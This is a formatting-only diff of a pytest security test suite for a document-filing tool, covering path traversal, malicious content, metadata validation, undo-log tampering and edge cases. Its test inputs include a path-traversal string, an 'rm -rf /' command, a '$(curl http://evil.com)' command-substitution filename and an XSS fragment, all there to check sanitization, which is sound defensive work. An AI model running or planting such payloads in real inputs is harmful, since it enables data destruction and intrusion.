@@ -8,6 +8,7 @@ Test categories:
   E. Apex Router Security
   F. Edge Case Inputs
 """
+
 from __future__ import annotations
 
 import pathlib
@@ -17,6 +18,7 @@ import pytest
 try:
     from hypothesis import HealthCheck, given, settings
     from hypothesis import strategies as st
+
     HYPOTHESIS_AVAILABLE = True
 except ImportError:
     HYPOTHESIS_AVAILABLE = False
@@ -31,16 +33,20 @@ from axelr.core import DocumentMetadata, UndoEntry, _safe_segment, _target_path
 # A. Path Traversal & Filename Sanitization
 # ══════════════════════════════════════════════════════════════════════════
 
-@pytest.mark.parametrize("bad_path", [
-    "../../etc/passwd",
-    "..\\..\\windows\\system32",
-    "/absolute/path/outside",
-    "file.exe",
-    "file.bat",
-    "file.sh",
-    "`rm -rf /``",
-    "$(curl http://evil.com)",
-])
+
+@pytest.mark.parametrize(
+    "bad_path",
+    [
+        "../../etc/passwd",
+        "..\\..\\windows\\system32",
+        "/absolute/path/outside",
+        "file.exe",
+        "file.bat",
+        "file.sh",
+        "`rm -rf /``",
+        "$(curl http://evil.com)",
+    ],
+)
 def test_a1_bad_filenames_sanitized(bad_path: str):
     """Dangerous filenames must be sanitized to safe segments."""
     safe = _safe_segment(bad_path)
@@ -64,8 +70,10 @@ def test_a2_any_input_sanitizes_to_safe_path(raw: str):
 def test_a3_target_path_never_escapes_root(inbox_root: pathlib.Path):
     """Target path must always be within the inbox root directory."""
     meta = DocumentMetadata(
-        document_type="invoice", date="2026-11-03",
-        sender="../../../etc", category="../../../../tmp",
+        document_type="invoice",
+        date="2026-11-03",
+        sender="../../../etc",
+        category="../../../../tmp",
         confidence=0.9,
     )
     dst = _target_path(inbox_root, meta, pathlib.Path("../../escape.txt"))
@@ -76,6 +84,7 @@ def test_a3_target_path_never_escapes_root(inbox_root: pathlib.Path):
 # ══════════════════════════════════════════════════════════════════════════
 # B. Malicious Document Content
 # ══════════════════════════════════════════════════════════════════════════
+
 
 @pytest.mark.asyncio
 async def test_b1_malicious_script_content_rejected(inbox_root: pathlib.Path):
@@ -124,17 +133,24 @@ Total: <img src=x onerror=alert(1)>
 # C. Metadata Injection & Forgery
 # ══════════════════════════════════════════════════════════════════════════
 
+
 def test_c1_metadata_fields_validated():
     """Metadata must enforce strict type and format validation."""
     with pytest.raises(Exception):
         DocumentMetadata(
-            document_type="invoice", date="invalid-date",
-            sender="", category="", confidence=2.0,
+            document_type="invoice",
+            date="invalid-date",
+            sender="",
+            category="",
+            confidence=2.0,
         )
 
     meta = DocumentMetadata(
-        document_type="invoice", date="2026-11-03",
-        sender="Test", category="Invoices", confidence=1.5,
+        document_type="invoice",
+        date="2026-11-03",
+        sender="Test",
+        category="Invoices",
+        confidence=1.5,
     )
     assert meta.confidence == 1.0
 
@@ -143,24 +159,29 @@ def test_c2_currency_normalized():
     """Currency codes must be normalized to uppercase ISO format."""
     from axelr.core import normalize_metadata
 
-    meta = normalize_metadata({
-        "currency": "usd",
-        "document_type": "invoice",
-        "confidence": 0.9,
-    })
+    meta = normalize_metadata(
+        {
+            "currency": "usd",
+            "document_type": "invoice",
+            "confidence": 0.9,
+        }
+    )
     assert meta["currency"] == "USD"
 
-    meta = normalize_metadata({
-        "currency": "eur",
-        "document_type": "invoice",
-        "confidence": 0.9,
-    })
+    meta = normalize_metadata(
+        {
+            "currency": "eur",
+            "document_type": "invoice",
+            "confidence": 0.9,
+        }
+    )
     assert meta["currency"] == "EUR"
 
 
 # ══════════════════════════════════════════════════════════════════════════
 # D. Undo Log Tampering
 # ══════════════════════════════════════════════════════════════════════════
+
 
 @pytest.mark.asyncio
 async def test_d1_undo_log_integrity(inbox_root: pathlib.Path):
@@ -171,13 +192,19 @@ async def test_d1_undo_log_integrity(inbox_root: pathlib.Path):
     log = UndoLog(log_path, max_entries=10)
 
     for i in range(5):
-        await log.record(UndoEntry(
-            op_id=f"op-{i}", timestamp=float(i), src=f"/a/{i}",
-            dst=f"/b/{i}", filename=f"f{i}", category="Invoices",
-            content_hash=f"h{i}",
-        ))
+        await log.record(
+            UndoEntry(
+                op_id=f"op-{i}",
+                timestamp=float(i),
+                src=f"/a/{i}",
+                dst=f"/b/{i}",
+                filename=f"f{i}",
+                category="Invoices",
+                content_hash=f"h{i}",
+            )
+        )
 
-    tampered_line = 'invalid json line without proper format'
+    tampered_line = "invalid json line without proper format"
     with open(log_path, "a") as f:
         f.write(tampered_line + "\n")
 
@@ -188,6 +215,7 @@ async def test_d1_undo_log_integrity(inbox_root: pathlib.Path):
 # ══════════════════════════════════════════════════════════════════════════
 # E. Apex Router Security
 # ══════════════════════════════════════════════════════════════════════════
+
 
 def test_e1_local_host_guard():
     """Apex Router must only allow local host connections."""
@@ -205,6 +233,7 @@ def test_e1_local_host_guard():
 # ══════════════════════════════════════════════════════════════════════════
 # F. Edge Case Inputs
 # ══════════════════════════════════════════════════════════════════════════
+
 
 @pytest.mark.parametrize("empty_input", ["", "   ", "\n\n", "\t\t"])
 def test_f1_empty_inputs_handled_safely(empty_input: str):
